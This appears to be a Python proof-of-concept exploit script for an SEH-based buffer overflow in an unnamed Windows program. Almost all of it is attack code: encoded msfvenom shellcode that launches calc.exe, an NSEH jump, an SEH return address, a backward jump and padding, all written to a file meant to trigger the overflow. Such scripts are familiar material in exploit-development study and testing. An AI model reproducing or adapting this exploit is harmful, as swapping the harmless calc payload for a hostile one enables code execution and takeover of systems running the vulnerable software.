## shellcode generated using msvenom.
## sudo msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f c

shellcode = ("\x89\xe7\xdb\xcc\xd9\x77\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x39\x6c\x6a\x48\x4d\x52\x65\x50\x47\x70\x63\x30\x51\x70\x4c"
"\x49\x4b\x55\x76\x51\x6f\x30\x31\x74\x4c\x4b\x76\x30\x30\x30"
"\x4c\x4b\x66\x32\x44\x4c\x6e\x6b\x51\x42\x37\x64\x4c\x4b\x63"
"\x42\x34\x68\x46\x6f\x78\x37\x30\x4a\x75\x76\x46\x51\x6b\x4f"
"\x4e\x4c\x57\x4c\x53\x51\x51\x6c\x44\x42\x46\x4c\x47\x50\x6a"
"\x61\x6a\x6f\x34\x4d\x65\x51\x6a\x67\x68\x62\x49\x62\x42\x72"
"\x63\x67\x4e\x6b\x66\x32\x72\x30\x6c\x4b\x43\x7a\x65\x6c\x6c"
"\x4b\x42\x6c\x46\x71\x43\x48\x49\x73\x43\x78\x76\x61\x4a\x71"
"\x50\x51\x6c\x4b\x32\x79\x55\x70\x56\x61\x6b\x63\x4e\x6b\x63"
"\x79\x52\x38\x68\x63\x57\x4a\x31\x59\x6e\x6b\x37\x44\x4c\x4b"
"\x56\x61\x79\x46\x54\x71\x59\x6f\x4e\x4c\x4b\x71\x7a\x6f\x34"
"\x4d\x46\x61\x38\x47\x44\x78\x59\x70\x44\x35\x38\x76\x77\x73"
"\x53\x4d\x78\x78\x37\x4b\x73\x4d\x54\x64\x73\x45\x6d\x34\x42"
"\x78\x4e\x6b\x46\x38\x54\x64\x35\x51\x7a\x73\x51\x76\x4c\x4b"
"\x66\x6c\x72\x6b\x6c\x4b\x71\x48\x55\x4c\x73\x31\x6b\x63\x6e"
"\x6b\x34\x44\x6e\x6b\x53\x31\x58\x50\x4c\x49\x50\x44\x61\x34"
"\x55\x74\x53\x6b\x43\x6b\x33\x51\x62\x79\x52\x7a\x66\x31\x4b"
"\x4f\x6b\x50\x61\x4f\x53\x6f\x33\x6a\x6e\x6b\x42\x32\x5a\x4b"
"\x6e\x6d\x63\x6d\x30\x6a\x57\x71\x6e\x6d\x6b\x35\x4d\x62\x45"
"\x50\x33\x30\x75\x50\x32\x70\x42\x48\x65\x61\x4c\x4b\x30\x6f"
"\x6c\x47\x39\x6f\x6e\x35\x4d\x6b\x5a\x50\x6c\x75\x6f\x52\x71"
"\x46\x73\x58\x6c\x66\x6e\x75\x6f\x4d\x4f\x6d\x79\x6f\x39\x45"
"\x47\x4c\x75\x56\x43\x4c\x46\x6a\x4b\x30\x69\x6b\x4d\x30\x31"
"\x65\x66\x65\x6f\x4b\x61\x57\x57\x63\x64\x32\x42\x4f\x50\x6a"
"\x45\x50\x32\x73\x79\x6f\x49\x45\x50\x63\x53\x51\x72\x4c\x50"
"\x63\x66\x4e\x71\x75\x74\x38\x73\x55\x53\x30\x41\x41")

#Bad characters.
badchars = "\x09\x0a\x0b\x0c\x0d\x1a\x20"


seh = "\x9b\x74\xe6\x6f" #0x6fe6749b
nseh = "\xeb\x06\x90\x90"
#Backward jump generated using nasm_shell tool from metasploit.
backwardjump = "\xE9\xC3\xF6\xFF\xFF"
garbagelen = 2352 - len(shellcode)
buf = shellcode + ("\xCC" * garbagelen) + nseh + seh + backwardjump + shellcode + "\xCC" * 50000


f = open("exploitseh.txt", "w")
f.write(buf)
f.close()
